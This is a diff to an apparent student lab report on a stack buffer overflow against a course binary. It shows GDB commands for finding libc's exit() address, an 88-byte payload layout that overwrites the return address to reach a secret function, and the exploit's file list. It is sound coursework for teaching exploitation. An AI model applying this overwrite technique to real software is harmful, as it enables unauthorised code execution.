@@ -126,16 +126,23 @@ Confirmed with:
 gdb -batch -ex 'starti' -ex 'info proc mappings' ./vulnprog
 ```
 
-The `exit()` address in libc was found with:
+The `exit()` address in libc is detected dynamically by `exploit.py` at runtime using GDB:
+
 ```bash
-gdb -batch -ex 'break main' -ex 'run' -ex 'print (void*)exit' ./vulnprog
-# → 0x7ffff7c47ba0
+gdb -batch -q \
+    -ex 'set breakpoint pending on' \
+    -ex 'break puts' \
+    -ex 'run' \
+    -ex 'print (void*)exit' \
+    ./vulnprog < /dev/null
 ```
 
-For Group 9:
+`break puts` is used instead of `break main` because the binary is stripped (no `main` symbol). On the bof-vuln VM this resolves to `0x7ffff7c47ba0`; on other systems the address differs but is found automatically.
+
+For Group 9 (bof-vuln VM example):
 ```
 Secret function = 0x555555554000 + 0x1319 = 0x555555555319
-exit()          = 0x7ffff7c47ba0
+exit()          = 0x7ffff7c47ba0  (varies by VM; detected at runtime)
 ```
 
 Both addresses are free of bytes `0x0a` and `0x21`.
@@ -149,10 +156,10 @@ Both addresses are free of bytes `0x0a` and `0x21`.
 ```
 Offset  Size  Content
 ──────────────────────────────────────────────────────
- 0      64    'A' × 64      fills the 64-byte fgets buffer
-64       8    'B' × 8       overwrites saved rbp (value irrelevant)
-72       8    0x555555555319 overwrites return address → Group 9 secret function
-80       8    0x7ffff7c47ba0 overwrites [rbp+0x10] → exit()
+ 0      64    'A' × 64        fills the 64-byte fgets buffer
+64       8    'B' × 8         overwrites saved rbp (value irrelevant)
+72       8    0x555555555319  overwrites return address → Group 9 secret function
+80       8    exit() address  overwrites [rbp+0x10] → exit() (detected at runtime)
 ```
 
 Total: 88 bytes, well within fgets' 127-byte limit.
@@ -225,13 +232,17 @@ Exit status: 16 (non-zero but clean — no crash, no signal. exit() is called wi
 | File | Purpose |
 |------|---------|
 | `exploit.py` | Main exploit — builds and sends the overflow payload |
-| `setup_vm.sh` | One-time environment setup (ASLR disable, package install) |
 | `run_exploit.sh` | Convenience wrapper to run the exploit for any group number |
+| `setup_vm.sh` | One-time environment setup (ASLR disable, package install) |
+| `cloud-config.yaml` | Multipass cloud-init config — installs packages and disables ASLR on VM launch |
+| `README.md` | Step-by-step instructions to recreate the exploit from a clean VM |
+| `requirements.txt` | Python package list (pwntools and dependencies) |
+| `exploit_pwntools.py` | Alternative pwntools-based exploit (same payload, different framework) |
 | `find_base.py` | Helper to verify the PIE base address via GDB |
 | `report.md` | This report |
 | `cmput333_group9_bof.txt` | Full terminal session captured with the `script` command |
 | `1.png` | GDB `info proc mappings` confirming PIE base `0x555555554000` |
-| `2.png` | GDB `print (void*)exit` confirming `exit() = 0x7ffff7c47ba0` |
+| `2.png` | GDB `print (void*)exit` confirming `exit()` address |
 | `3.png` | Exploit run showing `SECRET CMPUT 333 Group 09 reached` |
 
 ---
